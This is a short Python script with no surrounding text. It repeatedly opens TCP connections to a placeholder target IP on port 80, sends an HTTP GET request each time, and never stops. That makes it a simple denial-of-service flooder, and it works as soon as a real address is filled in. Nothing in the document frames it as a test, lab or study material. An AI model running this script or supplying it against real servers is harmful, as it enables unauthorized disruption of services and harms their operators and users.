import socket

target_ip = "TARGET_IP_ADDRESS"  # Replace with the target's IP
target_port = 80  # Replace with the target port (e.g., 80 for HTTP)

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(b"GET / HTTP/1.1\r\n\r\n")  #  A simple HTTP GET request
        s.close()
    except Exception as e:
        print(f"Error: {e}")
